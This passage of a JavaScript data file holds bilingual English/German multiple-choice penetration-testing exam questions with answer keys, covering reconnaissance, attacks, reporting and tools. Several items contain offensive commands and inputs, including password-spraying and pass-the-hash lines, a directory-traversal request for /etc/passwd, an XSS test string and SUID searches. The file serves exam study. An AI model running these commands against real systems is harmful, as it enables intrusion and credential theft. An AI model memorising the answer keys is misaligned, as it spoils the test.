    options: ['Blocks automated attacks', 'Lists directories webmasters want hidden from search engines', 'Encrypts web traffic', 'Configures web server security'],
    correctAnswer: 1,
    explanationEN: 'robots.txt instructs search engine crawlers which paths to avoid. Attackers read it to discover "hidden" directories (admin panels, backup files). Disallow: /admin reveals admin location. Not a security control - just guidance.',
    explanationDE: 'robots.txt weist Suchmaschinen-Crawler an, welche Pfade zu vermeiden sind. Angreifer lesen es, um "versteckte" Verzeichnisse zu entdecken.'
  },
  {
    id: 'mc26',
    domain: 'InfoGathering',
    questionEN: 'Which Nmap flag performs a UDP scan to identify services running on UDP ports?',
    questionDE: 'Welches Nmap-Flag führt einen UDP-Scan durch, um auf UDP-Ports laufende Dienste zu identifizieren?',
    options: ['-sT', '-sS', '-sU', '-sV'],
    correctAnswer: 2,
    explanationEN: '-sU performs UDP scan. UDP is stateless (no handshake), making scanning slower and less reliable than TCP. Important for DNS (53), SNMP (161), TFTP (69). -sT=TCP connect, -sS=SYN stealth, -sV=version detection.',
    explanationDE: '-sU führt UDP-Scan durch. UDP ist zustandslos (kein Handshake), was Scannen langsamer und weniger zuverlässig als TCP macht.'
  },
  {
    id: 'mc27',
    domain: 'InfoGathering',
    questionEN: 'When performing wireless reconnaissance, which tool is used to discover hidden SSIDs?',
    questionDE: 'Welches Tool wird bei drahtloser Aufklärung verwendet, um versteckte SSIDs zu entdecken?',
    options: ['Nmap', 'Airodump-ng', 'Metasploit', 'Burp Suite'],
    correctAnswer: 1,
    explanationEN: 'Airodump-ng captures wireless packets including probe requests/responses that reveal hidden SSIDs. Part of Aircrack-ng suite. Command: airodump-ng wlan0mon. Hidden SSIDs are "security through obscurity" - easily defeated.',
    explanationDE: 'Airodump-ng erfasst drahtlose Pakete einschließlich Probe-Requests/-Responses, die versteckte SSIDs offenbaren.'
  },
  {
    id: 'mc28',
    domain: 'InfoGathering',
    questionEN: 'What information can be gathered from SSL/TLS certificate analysis during reconnaissance?',
    questionDE: 'Welche Informationen können während der Aufklärung aus SSL/TLS-Zertifikatanalyse gesammelt werden?',
    options: ['Database credentials', 'Subdomains and organizational details', 'Source code', 'User passwords'],
    correctAnswer: 1,
    explanationEN: 'Certificates contain Subject Alternative Names (SANs) revealing subdomains, organizational info (O, OU, L), and email addresses. Certificate Transparency logs (crt.sh) provide historical certificate data. No credentials or code in certificates.',
    explanationDE: 'Zertifikate enthalten Subject Alternative Names (SANs), die Subdomains offenbaren, organisatorische Infos und E-Mail-Adressen.'
  },
  {
    id: 'mc29',
    domain: 'InfoGathering',
    questionEN: 'Which command identifies the operating system of a target host?',
    questionDE: 'Welcher Befehl identifiziert das Betriebssystem eines Zielhosts?',
    options: ['nmap -sV target', 'nmap -O target', 'nmap -sS target', 'nmap -p- target'],
    correctAnswer: 1,
    explanationEN: '-O enables OS detection via TCP/IP stack fingerprinting. Analyzes responses to crafted packets to infer OS. Requires root/admin privileges. -sV=service version, -sS=SYN scan, -p-=all ports.',
    explanationDE: '-O aktiviert OS-Erkennung via TCP/IP-Stack-Fingerprinting. Analysiert Antworten auf manipulierte Pakete, um OS zu schließen.'
  },
  {
    id: 'mc30',
    domain: 'InfoGathering',
    questionEN: 'A tester finds port 161/UDP open. What service is likely running and what reconnaissance can be performed?',
    questionDE: 'Ein Tester findet Port 161/UDP offen. Welcher Dienst läuft wahrscheinlich und welche Aufklärung kann durchgeführt werden?',
    options: ['DNS - Zone transfer', 'SNMP - Community string enumeration', 'SMB - File share enumeration', 'LDAP - Directory queries'],
    correctAnswer: 1,
    explanationEN: 'Port 161/UDP is SNMP (Simple Network Management Protocol). Default community strings (public/private) allow device enumeration. Command: snmpwalk -v2c -c public target. Reveals network devices, interfaces, routing tables.',
    explanationDE: 'Port 161/UDP ist SNMP. Standard-Community-Strings (public/private) erlauben Geräteenumeration. Befehl: snmpwalk -v2c -c public Ziel.'
  },
  {
    id: 'mc31',
    domain: 'InfoGathering',
    questionEN: 'What is the purpose of the --script flag in Nmap?',
    questionDE: 'Was ist der Zweck des --script-Flags in Nmap?',
    options: ['Enables scripting language support', 'Runs NSE (Nmap Scripting Engine) scripts for advanced enumeration', 'Creates custom port scanning scripts', 'Logs scan results to file'],
    correctAnswer: 1,
    explanationEN: 'NSE (Nmap Scripting Engine) uses Lua scripts for vulnerability detection, brute forcing, service enumeration. Example: --script vuln checks for common vulnerabilities, --script smb-enum-shares enumerates SMB shares.',
    explanationDE: 'NSE (Nmap Scripting Engine) verwendet Lua-Skripte für Schwachstellenerkennung, Brute-Force, Service-Enumeration.'
  },
  {
    id: 'mc32',
    domain: 'InfoGathering',
    questionEN: 'Which reconnaissance technique identifies email addresses and employee names from public sources?',
    questionDE: 'Welche Aufklärungstechnik identifiziert E-Mail-Adressen und Mitarbeiternamen aus öffentlichen Quellen?',
    options: ['Banner grabbing', 'OSINT (Open Source Intelligence)', 'Port scanning', 'Vulnerability assessment'],
    correctAnswer: 1,
    explanationEN: 'OSINT gathers publicly available information from social media (LinkedIn), search engines, company websites, breach databases. Tools: theHarvester, Maltego, SpiderFoot. Critical for social engineering and password spraying.',
    explanationDE: 'OSINT sammelt öffentlich verfügbare Informationen aus sozialen Medien, Suchmaschinen, Unternehmenswebsites. Werkzeuge: theHarvester, Maltego.'
  },
  {
    id: 'mc33',
    domain: 'InfoGathering',
    questionEN: 'A penetration tester discovers open port 445. What initial enumeration should be performed?',
    questionDE: 'Ein Penetrationstester entdeckt offenen Port 445. Welche anfängliche Enumeration sollte durchgeführt werden?',
    options: ['HTTP methods testing', 'SMB share enumeration', 'SNMP community string guessing', 'SQL injection'],
    correctAnswer: 1,
    explanationEN: 'Port 445 is SMB (Server Message Block). Enumerate shares with smbclient, enum4linux, or nmap scripts. Check for null sessions, anonymous access, weak permissions. SMB is high-value target for lateral movement.',
    explanationDE: 'Port 445 ist SMB. Enumerate Freigaben mit smbclient, enum4linux oder nmap-Skripten. Überprüfe auf Null-Sessions, anonymen Zugriff.'
  },

  // Continue to next part (DOMAIN 3: ATTACKS - 35%, DOMAIN 4: REPORTING - 15%, DOMAIN 5: TOOLS - 20%)
  // ... remaining 57 questions would follow here

  // DOMAIN 3: ATTACKS & EXPLOITS (35% - 32 questions)
  {
    id: 'mc34',
    domain: 'Attacks',
    questionEN: 'A penetration tester gains RDP access with low privileges and runs PrintNightmare exploit to create admin user "hacker". The runas command still shows low privileges. What should the tester do next?',
    questionDE: 'Ein Penetrationstester erhält RDP-Zugriff mit niedrigen Rechten und führt PrintNightmare-Exploit aus, um Admin-Benutzer "hacker" zu erstellen. Der runas-Befehl zeigt immer noch niedrige Rechte. Was sollte der Tester als Nächstes tun?',
    options: ['Log off and log on with "hacker"', 'Attempt to add another user', 'Bypass the execution policy', 'Add a malicious printer driver'],
    correctAnswer: 0,
    explanationEN: 'New user account requires fresh login session to activate elevated privileges. Runas executes commands with different credentials but within same session context. Log off and authenticate as "hacker" to obtain admin rights.',
    explanationDE: 'Neues Benutzerkonto erfordert frische Login-Sitzung zur Aktivierung erhöhter Rechte. Abmelden und als "hacker" authentifizieren, um Admin-Rechte zu erhalten.'
  },
  {
    id: 'mc35',
    domain: 'Attacks',
    questionEN: 'Which Metasploit exploit targets the SMBv1 vulnerability in Windows 7/2008 systems?',
    questionDE: 'Welcher Metasploit-Exploit zielt auf die SMBv1-Schwachstelle in Windows 7/2008-Systemen ab?',
    options: ['exploit/windows/smb/psexec', 'exploit/windows/smb/ms08_067_netapi', 'exploit/windows/smb/ms17_010_eternalblue', 'auxiliary/scanner/snmp/snmp_login'],
    correctAnswer: 2,
    explanationEN: 'MS17-010 EternalBlue exploits SMBv1 remote code execution vulnerability. NSA-developed exploit leaked by Shadow Brokers, used in WannaCry ransomware. Critical vulnerability affecting Windows 7/2008. psexec requires valid credentials.',
    explanationDE: 'MS17-010 EternalBlue nutzt SMBv1-Remote-Code-Execution-Schwachstelle aus. Von NSA entwickelter Exploit, der von Shadow Brokers geleakt wurde.'
  },
  {
    id: 'mc36',
    domain: 'Attacks',
    questionEN: 'A tester runs: crackmapexec smb 192.168.1.0/24 -u user.txt -p Summer123@. What attack is being performed?',
    questionDE: 'Ein Tester führt aus: crackmapexec smb 192.168.1.0/24 -u user.txt -p Summer123@. Welcher Angriff wird durchgeführt?',
    options: ['Brute force', 'Password spraying', 'Dictionary attack', 'Rainbow table'],
    correctAnswer: 1,
    explanationEN: 'Password spraying tries single password (Summer123@) against many usernames to avoid account lockouts. Opposite of brute force (many passwords, one user). Effective against organizations with weak password policies.',
    explanationDE: 'Password Spraying versucht einzelnes Passwort gegen viele Benutzernamen, um Kontosperrungen zu vermeiden. Effektiv gegen Organisationen mit schwachen Passwortrichtlinien.'
  },
  {
    id: 'mc37',
    domain: 'Attacks',
    questionEN: 'Which command performs directory brute forcing on a web application?',
    questionDE: 'Welcher Befehl führt Directory-Brute-Forcing auf einer Webanwendung durch?',
    options: ['nmap -sV target.com', 'gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt', 'hydra -L users.txt -P pass.txt target.com http-post-form', 'sqlmap -u https://target.com --dbs'],
    correctAnswer: 1,
    explanationEN: 'Gobuster dir mode brute forces directories/files using wordlist. Faster than DirBuster. Discovers hidden admin panels, backup files, config files. -u=URL, -w=wordlist, -x adds extensions (php,html,txt).',
    explanationDE: 'Gobuster dir-Modus brute-forced Verzeichnisse/Dateien mit Wortliste. Schneller als DirBuster. Entdeckt versteckte Admin-Panels, Backup-Dateien.'
  },
  {
    id: 'mc38',
    domain: 'Attacks',
    questionEN: 'A tester discovers GET /foo/images/file?id=../../../etc/passwd. What vulnerability is being exploited?',
    questionDE: 'Ein Tester entdeckt GET /foo/images/file?id=../../../etc/passwd. Welche Schwachstelle wird ausgenutzt?',
    options: ['Insecure Direct Object Reference', 'Cross-Site Request Forgery', 'Directory Traversal', 'Local File Inclusion'],
    correctAnswer: 2,
    explanationEN: 'Directory traversal uses ../ sequences to navigate up directory tree and access files outside web root. Reading /etc/passwd reveals system users. Remediation: input validation, whitelist allowed files, chroot jail.',
    explanationDE: 'Directory Traversal verwendet ../-Sequenzen, um im Verzeichnisbaum nach oben zu navigieren und auf Dateien außerhalb des Web-Roots zuzugreifen.'
  },
  {
    id: 'mc39',
    domain: 'Attacks',
    questionEN: 'Which technique allows a penetration tester to leverage a CSRF vulnerability to gather sensitive details from end users?',
    questionDE: 'Welche Technik ermöglicht es einem Penetrationstester, eine CSRF-Schwachstelle zu nutzen, um sensible Details von Endbenutzern zu sammeln?',
    options: ['Browser Exploitation Framework (BeEF)', 'Maltego', 'Metasploit', 'theHarvester'],
    correctAnswer: 0,
    explanationEN: 'BeEF hooks browsers via XSS/CSRF, performing client-side attacks. Can capture keystrokes, steal cookies, inject content, and exploit browser vulns. Specifically designed for browser-based attacks. Metasploit is general exploitation framework.',
    explanationDE: 'BeEF hookt Browser via XSS/CSRF und führt Client-seitige Angriffe durch. Kann Tastatureingaben erfassen, Cookies stehlen, Inhalt einfügen.'
  },
  {
    id: 'mc40',
    domain: 'Attacks',
    questionEN: 'What SQL injection technique uses time delays to infer database information?',
    questionDE: 'Welche SQL-Injection-Technik verwendet Zeitverzögerungen, um Datenbankinformationen abzuleiten?',
    options: ['Union-based SQLi', 'Error-based SQLi', 'Boolean-based blind SQLi', 'Time-based blind SQLi'],
    correctAnswer: 3,
    explanationEN: 'Time-based blind SQLi uses WAITFOR DELAY (MSSQL), SLEEP() (MySQL), or pg_sleep() (PostgreSQL) to infer True/False. If page delays, query returned True. Used when no visual feedback from database.',
    explanationDE: 'Time-based Blind SQLi verwendet WAITFOR DELAY, SLEEP() oder pg_sleep(), um True/False abzuleiten. Wenn Seite verzögert, gab Abfrage True zurück.'
  },
  {
    id: 'mc41',
    domain: 'Attacks',
    questionEN: 'A web application is vulnerable to XXE (XML External Entity). What is the potential impact?',
    questionDE: 'Eine Webanwendung ist anfällig für XXE (XML External Entity). Was ist die potenzielle Auswirkung?',
    options: ['Denial of Service only', 'Reading local files, SSRF, and DoS', 'Database corruption', 'Memory overflow'],
    correctAnswer: 1,
    explanationEN: 'XXE allows: 1) Reading local files (e.g., /etc/passwd), 2) Server-Side Request Forgery to internal services, 3) Denial of Service (billion laughs attack), 4) Port scanning internal network. Disable external entity processing in XML parsers.',
    explanationDE: 'XXE erlaubt: 1) Lesen lokaler Dateien, 2) Server-Side Request Forgery zu internen Diensten, 3) Denial of Service, 4) Port-Scannen internes Netzwerk.'
  },
  // Add remaining 24 questions for Attacks domain...

  // DOMAIN 4: REPORTING & COMMUNICATION (15% - 14 questions)  
  {
    id: 'mc65',
    domain: 'Reporting',
    questionEN: 'Which section of a penetration testing report should be understandable to non-technical stakeholders?',
    questionDE: 'Welcher Abschnitt eines Penetrationstestberichts sollte für nicht-technische Interessengruppen verständlich sein?',
    options: ['Technical findings', 'Executive summary', 'Exploitation details', 'Command outputs'],
    correctAnswer: 1,
    explanationEN: 'Executive summary provides high-level overview of findings, business impact, and recommendations without technical jargon. Targets C-level executives and board members. Technical findings section contains detailed exploitation steps.',
    explanationDE: 'Executive Summary bietet hochrangigen Überblick über Ergebnisse, Geschäftsauswirkungen und Empfehlungen ohne technischen Jargon.'
  },
  // Add remaining 13 questions for Reporting domain...
  // REPORTING DOMAIN - Additional 13 questions (mc42-mc54)
  {
    id: 'mc42',
    domain: 'Reporting',
    questionEN: 'What CVSS score indicates a critical vulnerability requiring immediate remediation?',
    questionDE: 'Welcher CVSS-Score zeigt eine kritische Schwachstelle an, die sofortige Behebung erfordert?',
    options: ['4.0-6.9', '7.0-8.9', '9.0-10.0', '0.1-3.9'],
    correctAnswer: 2,
    explanationEN: 'CVSS scores 9.0-10.0 are Critical severity, 7.0-8.9 High, 4.0-6.9 Medium, 0.1-3.9 Low. Critical findings demand immediate attention.',
    explanationDE: 'CVSS-Scores 9.0-10.0 sind kritischer Schweregrad, erfordern sofortige Aufmerksamkeit.'
  },
  {
    id: 'mc43',
    domain: 'Reporting',
    questionEN: 'In a pentest report, which metric best communicates risk to executives?',
    questionDE: 'Welche Metrik kommuniziert Risiko am besten an Führungskräfte in einem Pentest-Bericht?',
    options: ['Number of ports open', 'Business impact assessment', 'List of tools used', 'Technical exploit details'],
    correctAnswer: 1,
    explanationEN: 'Business impact shows how vulnerabilities affect operations, revenue, compliance. Executives need business context, not technical details.',
    explanationDE: 'Geschäftsauswirkungen zeigen, wie Schwachstellen Betrieb, Umsatz, Compliance beeinflussen.'
  },
  {
    id: 'mc44',
    domain: 'Reporting',
    questionEN: 'What should be included in the remediation timeline section?',
    questionDE: 'Was sollte im Abschnitt Behebungszeitplan enthalten sein?',
    options: ['Exploit code', 'Prioritized action items with deadlines', 'Penetration test methodology', 'Password hashes'],
    correctAnswer: 1,
    explanationEN: 'Remediation timeline prioritizes fixes (Critical→High→Medium→Low) with realistic deadlines based on severity and complexity.',
    explanationDE: 'Behebungszeitplan priorisiert Fixes mit realistischen Fristen basierend auf Schweregrad.'
  },
  {
    id: 'mc45',
    domain: 'Reporting',
    questionEN: 'Which documentation practice ensures report integrity and non-repudiation?',
    questionDE: 'Welche Dokumentationspraxis gewährleistet Berichtsintegrität und Nichtabstreitbarkeit?',
    options: ['Using spell check', 'Digital signatures and timestamps', 'Color coding findings', 'Including screenshots only'],
    correctAnswer: 1,
    explanationEN: 'Digital signatures verify report authenticity and prevent tampering. Timestamps prove when activities occurred.',
    explanationDE: 'Digitale Signaturen verifizieren Berichtsauthentizität und verhindern Manipulation.'
  },
  {
    id: 'mc46',
    domain: 'Reporting',
    questionEN: 'A report contains PII collected during testing. What is the proper handling?',
    questionDE: 'Ein Bericht enthält PII, die während des Tests gesammelt wurden. Was ist die richtige Handhabung?',
    options: ['Share report publicly', 'Mark as confidential, encrypt, limit access', 'Post on social media', 'Email without encryption'],
    correctAnswer: 1,
    explanationEN: 'PII (Personally Identifiable Information) requires confidential handling, encryption at rest/transit, access controls. GDPR/HIPAA compliance mandatory.',
    explanationDE: 'PII erfordert vertrauliche Handhabung, Verschlüsselung, Zugriffskontrollen. GDPR/HIPAA-Konformität obligatorisch.'
  },
  {
    id: 'mc47',
    domain: 'Reporting',
    questionEN: 'What is the purpose of including attack narrative in technical findings?',
    questionDE: 'Was ist der Zweck der Einbeziehung von Angriffsschilderung in technischen Ergebnissen?',
    options: ['Make report longer', 'Demonstrate exploitation path and methodology', 'Show off technical skills', 'Confuse readers'],
    correctAnswer: 1,
    explanationEN: 'Attack narrative documents step-by-step exploitation process, helping IT teams understand and reproduce findings for validation.',
    explanationDE: 'Angriffsschilderung dokumentiert schrittweisen Exploitation-Prozess, hilft IT-Teams Ergebnisse zu verstehen.'
  },
  {
    id: 'mc48',
    domain: 'Reporting',
    questionEN: 'Which finding severity classification considers both likelihood and impact?',
    questionDE: 'Welche Schweregradbewertung berücksichtigt sowohl Wahrscheinlichkeit als auch Auswirkung?',
    options: ['CVSS only', 'Risk rating (Likelihood × Impact)', 'Port count', 'Number of vulnerabilities'],
    correctAnswer: 1,
    explanationEN: 'Risk = Likelihood × Impact. High likelihood + High impact = Critical risk. Low likelihood + High impact = Medium risk. Provides business-relevant prioritization.',
    explanationDE: 'Risiko = Wahrscheinlichkeit × Auswirkung. Bietet geschäftsrelevante Priorisierung.'
  },
  {
    id: 'mc49',
    domain: 'Reporting',
    questionEN: 'What information must be included in the scope statement of a report?',
    questionDE: 'Welche Informationen müssen in der Scope-Erklärung eines Berichts enthalten sein?',
    options: ['Marketing materials', 'IP ranges, domains, test duration, limitations', 'Competitor analysis', 'Stock prices'],
    correctAnswer: 1,
    explanationEN: 'Scope defines what was tested (IP ranges, domains), when (dates/duration), and limitations (black/white box, excluded systems).',
    explanationDE: 'Scope definiert, was getestet wurde, wann und Einschränkungen.'
  },
  {
    id: 'mc50',
    domain: 'Reporting',
    questionEN: 'How should false positives be handled in the final report?',
    questionDE: 'Wie sollten False Positives im Endbericht behandelt werden?',
    options: ['Include all unverified', 'Exclude after validation, document in methodology', 'Ignore completely', 'Mark as critical'],
    correctAnswer: 1,
    explanationEN: 'Validate findings, exclude false positives from final report, document validation process in methodology section to maintain credibility.',
    explanationDE: 'Validiere Ergebnisse, schließe False Positives aus, dokumentiere Validierungsprozess.'
  },
  {
    id: 'mc51',
    domain: 'Reporting',
    questionEN: 'What is the recommended format for vulnerability evidence?',
    questionDE: 'Was ist das empfohlene Format für Schwachstellennachweise?',
    options: ['Text description only', 'Screenshots + command output + timestamps', 'Verbal explanation', 'No evidence needed'],
    correctAnswer: 1,
    explanationEN: 'Comprehensive evidence includes screenshots, command outputs, timestamps, HTTP requests/responses. Proves vulnerability existence and helps IT reproduce.',
    explanationDE: 'Umfassende Nachweise umfassen Screenshots, Befehlsausgaben, Zeitstempel. Beweist Schwachstellenexistenz.'
  },
  {
    id: 'mc52',
    domain: 'Reporting',
    questionEN: 'Which metric demonstrates testing coverage to stakeholders?',
    questionDE: 'Welche Metrik zeigt Testabdeckung den Stakeholdern?',
    options: ['Number of exploits', 'Percentage of scope tested (hosts scanned/total)', 'Tool versions', 'Tester experience'],
    correctAnswer: 1,
    explanationEN: 'Coverage metrics show extent of testing: hosts scanned/total, services tested, attack vectors attempted. Demonstrates thoroughness.',
    explanationDE: 'Abdeckungsmetriken zeigen Testumfang: gescannte Hosts/Gesamt, getestete Dienste.'
  },
  {
    id: 'mc53',
    domain: 'Reporting',
    questionEN: 'What should be documented when a critical vulnerability cannot be exploited?',
    questionDE: 'Was sollte dokumentiert werden, wenn eine kritische Schwachstelle nicht ausgenutzt werden kann?',
    options: ['Nothing', 'Mitigating controls, compensating factors, risk acceptance', 'Remove from report', 'Mark as low severity'],
    correctAnswer: 1,
    explanationEN: 'Document why exploitation failed: network segmentation, IDS/IPS, WAF, patching. Shows defense-in-depth effectiveness.',
    explanationDE: 'Dokumentiere, warum Exploitation fehlschlug: Netzwerksegmentierung, IDS/IPS, WAF.'
  },
  {
    id: 'mc54',
    domain: 'Reporting',
    questionEN: 'How long should pentest reports be retained per compliance requirements?',
    questionDE: 'Wie lange sollten Pentest-Berichte gemäß Compliance-Anforderungen aufbewahrt werden?',
    options: ['1 week', '1 month', '1-7 years depending on regulation', 'Forever'],
    correctAnswer: 2,
    explanationEN: 'PCI DSS: 1 year, HIPAA: 6 years, SOX: 7 years. Retention policies vary by industry regulation and legal requirements.',
    explanationDE: 'PCI DSS: 1 Jahr, HIPAA: 6 Jahre, SOX: 7 Jahre. Aufbewahrungsrichtlinien variieren.'
  },
  // ATTACKS DOMAIN - Additional questions (mc55-mc66)
  {
    id: 'mc55',
    domain: 'Attacks',
    questionEN: 'Which attack allows an attacker to intercept and modify traffic between client and server?',
    questionDE: 'Welcher Angriff ermöglicht es einem Angreifer, Datenverkehr zwischen Client und Server abzufangen und zu modifizieren?',
    options: ['DoS', 'Man-in-the-Middle (MitM)', 'SQL Injection', 'Buffer Overflow'],
    correctAnswer: 1,
    explanationEN: 'MitM attack intercepts communication, allows eavesdropping and tampering. Common techniques: ARP spoofing, DNS spoofing, SSL stripping.',
    explanationDE: 'MitM-Angriff fängt Kommunikation ab, ermöglicht Abhören und Manipulation.'
  },
  {
    id: 'mc56',
    domain: 'Attacks',
    questionEN: 'What is the purpose of a reverse shell in post-exploitation?',
    questionDE: 'Was ist der Zweck einer Reverse Shell in der Post-Exploitation?',
    options: ['Scan ports', 'Establish persistent command and control from target to attacker', 'Crack passwords', 'Enumerate services'],
    correctAnswer: 1,
    explanationEN: 'Reverse shell connects from target to attacker, bypassing firewall rules that block incoming connections. Maintains remote access.',
    explanationDE: 'Reverse Shell verbindet vom Ziel zum Angreifer, umgeht Firewall-Regeln.'
  },
  {
    id: 'mc57',
    domain: 'Attacks',
    questionEN: 'Which technique escalates privileges by exploiting misconfigured SUID binaries in Linux?',
    questionDE: 'Welche Technik eskaliert Rechte durch Ausnutzung falsch konfigurierter SUID-Binaries in Linux?',
    options: ['Phishing', 'SUID binary abuse', 'Port scanning', 'SQL injection'],
    correctAnswer: 1,
    explanationEN: 'SUID binaries run with owner privileges. Misconfigured SUID root binaries allow privilege escalation. Check with: find / -perm -4000',
    explanationDE: 'SUID-Binaries laufen mit Besitzerrechten. Falsch konfigurierte erlauben Rechteeskalation.'
  },
  {
    id: 'mc58',
    domain: 'Attacks',
    questionEN: 'A tester uses Responder to capture NetNTLMv2 hashes. What is the next step?',
    questionDE: 'Ein Tester verwendet Responder, um NetNTLMv2-Hashes zu erfassen. Was ist der nächste Schritt?',
    options: ['Delete hashes', 'Crack with hashcat or relay with ntlmrelayx', 'Email to client', 'Ignore'],
    correctAnswer: 1,
    explanationEN: 'NetNTLMv2 hashes can be cracked offline (hashcat -m 5600) or relayed to other services (ntlmrelayx) for authentication.',
    explanationDE: 'NetNTLMv2-Hashes können offline geknackt oder an andere Dienste weitergeleitet werden.'
  },
  {
    id: 'mc59',
    domain: 'Attacks',
    questionEN: 'What is Kerberoasting and which accounts are vulnerable?',
    questionDE: 'Was ist Kerberoasting und welche Konten sind anfällig?',
    options: ['Attacks SSH', 'Targets service accounts with SPNs in Active Directory', 'Exploits web servers', 'Attacks databases'],
    correctAnswer: 1,
    explanationEN: 'Kerberoasting requests Kerberos service tickets (TGS) for accounts with SPNs, extracts encrypted tickets, cracks offline to recover passwords.',
    explanationDE: 'Kerberoasting fordert Kerberos-Service-Tickets für Konten mit SPNs an, extrahiert verschlüsselte Tickets, knackt offline.'
  },
  {
    id: 'mc60',
    domain: 'Attacks',
    questionEN: 'Which command performs a Pass-the-Hash attack using crackmapexec?',
    questionDE: 'Welcher Befehl führt einen Pass-the-Hash-Angriff mit crackmapexec aus?',
    options: ['cme smb 10.0.0.1 -u admin -p password', 'cme smb 10.0.0.1 -u admin -H NTLM_HASH', 'cme ftp 10.0.0.1', 'cme http 10.0.0.1'],
    correctAnswer: 1,
    explanationEN: 'Pass-the-Hash uses NTLM hash directly for authentication without cracking. Syntax: -H <NTLM hash>. Requires SMB or WMI access.',
    explanationDE: 'Pass-the-Hash verwendet NTLM-Hash direkt zur Authentifizierung ohne Knacken.'
  },
  {
    id: 'mc61',
    domain: 'Attacks',
    questionEN: 'A web app reflects user input without encoding. What attack is possible?',
    questionDE: 'Eine Web-App spiegelt Benutzereingaben ohne Kodierung wider. Welcher Angriff ist möglich?',
    options: ['Buffer Overflow', 'Cross-Site Scripting (XSS)', 'ARP Spoofing', 'Port Scanning'],
    correctAnswer: 1,
    explanationEN: 'XSS injects malicious JavaScript via unvalidated input. Reflected XSS executes immediately. Test with: <script>alert(1)</script>',
    explanationDE: 'XSS injiziert bösartiges JavaScript über unvalidierte Eingabe.'
  },
  {
    id: 'mc62',
    domain: 'Attacks',
    questionEN: 'Which technique bypasses application whitelisting in Windows?',
    questionDE: 'Welche Technik umgeht Application Whitelisting in Windows?',
    options: ['Phishing', 'Living off the Land (LoLBins)', 'Port scanning', 'ARP spoofing'],
    correctAnswer: 1,
    explanationEN: 'LoLBins use legitimate Windows binaries (regsvr32, mshta, rundll32) to execute malicious code, bypassing AppLocker/WDAC.',
    explanationDE: 'LoLBins verwenden legitime Windows-Binaries, um bösartigen Code auszuführen.'
  },
  {
    id: 'mc63',
    domain: 'Attacks',
    questionEN: 'What is the primary goal of lateral movement in a network?',
    questionDE: 'Was ist das Hauptziel der lateralen Bewegung in einem Netzwerk?',
    options: ['External scanning', 'Access additional systems and escalate privileges', 'Delete logs', 'Install antivirus'],
    correctAnswer: 1,
    explanationEN: 'Lateral movement spreads access from initial foothold to critical systems. Techniques: Pass-the-Hash, RDP, PsExec, WMI.',
    explanationDE: 'Laterale Bewegung verbreitet Zugriff von initialem Foothold zu kritischen Systemen.'
  },
  {
    id: 'mc64',
    domain: 'Attacks',
    questionEN: 'A tester discovers MongoDB without authentication. What is the immediate risk?',
    questionDE: 'Ein Tester entdeckt MongoDB ohne Authentifizierung. Was ist das unmittelbare Risiko?',
    options: ['No risk', 'Complete database access, data theft/modification', 'Slow performance', 'Better security'],
    correctAnswer: 1,
    explanationEN: 'Unauthenticated MongoDB allows full database access. Attackers can read, modify, delete data. Check with: mongo --host TARGET',
    explanationDE: 'Nicht authentifiziertes MongoDB erlaubt vollen Datenbankzugriff.'
  },
  {
    id: 'mc66',
    domain: 'Attacks',
    questionEN: 'Which Windows privilege escalation technique exploits unquoted service paths?',
    questionDE: 'Welche Windows-Rechteeskalationstechnik nutzt unquoted Service-Pfade aus?',
    options: ['SQL injection', 'Path hijacking', 'XSS', 'DDoS'],
    correctAnswer: 1,
    explanationEN: 'Unquoted paths with spaces allow binary planting. Example: C:\\Program Files\\App\\service.exe tries C:\\Program.exe first.',
    explanationDE: 'Unquoted Pfade mit Leerzeichen erlauben Binary-Planting.'
  },
  // TOOLS DOMAIN - Additional questions (mc67-mc78, mc80-mc90)
  {
    id: 'mc67',
    domain: 'Tools',
    questionEN: 'Which tool automates SQL injection attacks?',
    questionDE: 'Welches Tool automatisiert SQL-Injection-Angriffe?',
    options: ['Nmap', 'sqlmap', 'Wireshark', 'Hydra'],
    correctAnswer: 1,
    explanationEN: 'sqlmap detects and exploits SQL injection vulnerabilities, extracts database contents, provides OS shell access. Supports multiple DBMS.',
    explanationDE: 'sqlmap erkennt und nutzt SQL-Injection-Schwachstellen aus, extrahiert Datenbankinhalte.'
  },
  {
    id: 'mc68',
    domain: 'Tools',
    questionEN: 'What is the purpose of Gobuster?',
    questionDE: 'Was ist der Zweck von Gobuster?',
    options: ['Password cracking', 'Directory and DNS subdomain enumeration', 'Packet capture', 'Port scanning'],
    correctAnswer: 1,
    explanationEN: 'Gobuster brute-forces directories, files, subdomains. Faster than DirBuster. Modes: dir (directories), dns (subdomains), vhost (virtual hosts).',
    explanationDE: 'Gobuster erzwingt Verzeichnisse, Dateien, Subdomains brutal.'
  },
  {
    id: 'mc69',
    domain: 'Tools',
    questionEN: 'Which tool cracks password hashes using GPU acceleration?',
    questionDE: 'Welches Tool knackt Passwort-Hashes mit GPU-Beschleunigung?',
    options: ['Nmap', 'Hashcat', 'Metasploit', 'Burp Suite'],
    correctAnswer: 1,
    explanationEN: 'Hashcat uses GPU for massive parallel hash cracking. Supports 300+ hash types. Modes: dictionary, brute-force, hybrid, rule-based.',
    explanationDE: 'Hashcat verwendet GPU für massiv paralleles Hash-Cracking.'
  },
  {
    id: 'mc70',
    domain: 'Tools',
    questionEN: 'What is Metasploit Framework primarily used for?',
    questionDE: 'Wofür wird Metasploit Framework hauptsächlich verwendet?',
    options: ['Email client', 'Exploitation framework with exploits, payloads, post-exploitation', 'Web browser', 'Antivirus'],
    correctAnswer: 1,
    explanationEN: 'Metasploit provides exploits, payloads (Meterpreter), post-exploitation modules, auxiliary scanners. Industry-standard pentesting tool.',
    explanationDE: 'Metasploit bietet Exploits, Payloads, Post-Exploitation-Module.'
  },
  {
    id: 'mc71',
    domain: 'Tools',
    questionEN: 'Which tool intercepts and modifies HTTP/HTTPS requests?',
    questionDE: 'Welches Tool fängt HTTP/HTTPS-Anfragen ab und modifiziert sie?',
    options: ['Nmap', 'Burp Suite', 'John the Ripper', 'Responder'],
    correctAnswer: 1,
    explanationEN: 'Burp Suite proxy intercepts web traffic, allows tampering, fuzzing, scanning. Essential for web app pentesting.',
    explanationDE: 'Burp Suite Proxy fängt Webverkehr ab, erlaubt Manipulation, Fuzzing.'
  },
  {
    id: 'mc72',
    domain: 'Tools',
    questionEN: 'What does Wireshark analyze?',
    questionDE: 'Was analysiert Wireshark?',
    options: ['Source code', 'Network packets', 'File systems', 'Registry'],
    correctAnswer: 1,
    explanationEN: 'Wireshark captures and analyzes network packets. Displays protocols, payloads, helps identify cleartext credentials, malware traffic.',
    explanationDE: 'Wireshark erfasst und analysiert Netzwerkpakete.'
  },
  {
    id: 'mc73',
    domain: 'Tools',
